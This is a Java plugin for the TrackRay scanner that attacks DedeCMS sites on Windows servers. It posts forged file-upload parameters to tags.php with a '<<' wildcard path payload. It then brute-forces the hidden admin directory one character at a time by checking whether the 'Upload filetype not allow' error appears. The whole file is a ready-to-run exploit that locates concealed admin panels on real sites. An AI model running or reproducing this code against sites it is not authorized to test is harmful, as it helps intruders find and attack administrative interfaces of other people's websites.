package com.trackray.module.plugin.webapp.dedecms;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.httpclient.Fetcher;
import com.trackray.base.plugin.WebSocketPlugin;
import org.apache.commons.lang3.StringUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;


@Rule(params = {@Param(key = "target", desc = "猜解的目标"),},
       websocket = true )
@Plugin(title = "dedecms windows下后台暴力猜解" , author = "浅蓝")
public class DedeFindManage extends WebSocketPlugin {
    private String characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#";
    private String url;
    @Override
    public boolean check(Map param) {
        url = param.get("target").toString();
        return !param.isEmpty();
    }

    @Override
    public Object start() {
        boolean flag = false;
        url = url.concat("/tags.php");
        String prefix = "";
        String payload = "./%s<</images/adminico.gif";
        char[] chars = characters.toCharArray();
        crawlerPage.getRequest().setUrl(url);
        crawlerPage.getRequest().setHttpMethod(HttpMethod.POST);
        Map params = new HashMap<String,String>();
        params.put("_FILES[mochazz][tmp_name]","");
        params.put("_FILES[mochazz][name]","0");
        params.put("_FILES[mochazz][size]","0");
        params.put("_FILES[mochazz][type]","image/gif");
        crawlerPage.getRequest().setParamMap(params);

        Fetcher fetcher = new Fetcher();
        for (int i = 1; i <=7; i++) {
            if (flag)
                break;
            ArrayList<String> list = new ArrayList<>();
            permutation1(list,characters, "", i);
            for (String str : list) {
                send("testing:"+str);
                params.put("_FILES[mochazz][tmp_name]",String.format(payload,str));
                fetcher.run(crawlerPage);
                String string = crawlerPage.getResponse().getStatus().getContentString();
                if (!StringUtils.contains(string , "Upload filetype not allow") && crawlerPage.getResponse().getStatus().getStatusCode() == 200)
                {
                    flag = true;
                    prefix = str;
                    break;
                }
            }
        }

        if (StringUtils.isNotBlank(prefix)){
            send("prefix:"+prefix);
            boolean f= false;
            for (int i = 0; i < 30; i++) {
                if (f)
                    break;
                for (char c : chars) {
                    if (c == chars[chars.length-1])
                        f=true;
                    String s = String.valueOf(c);
                    params.put("_FILES[mochazz][tmp_name]",String.format(payload,prefix+s));
                    fetcher.run(crawlerPage);
                    String string = crawlerPage.getResponse().getStatus().getContentString();
                    if (!string.contains("Upload filetype not allow") && crawlerPage.getResponse().getStatus().getStatusCode() == 200)
                    {
                        prefix+= s;
                        send("[+]"+prefix);
                        break;
                    }
                }
            }

            send("[+]后台地址为:"+prefix);
        }
        return prefix;
    }

    public  void permutation1(ArrayList<String> list, String str, String result, int len){

        if(result.length()==len){            //表示遍历完了一个全排列结果
            list.add(result);
        }
        else{
            for(int i=0;i<str.length();i++){
                if(result.indexOf(str.charAt(i))<0){    //返回指定字符在此字符串中第一次出现处的索引。
                    //System.out.println("字母："+str.charAt(i));
                    permutation1(list, str, result+str.charAt(i), len);
                }
            }
        }

    }

    public static void main(String[] args) {
    }
}
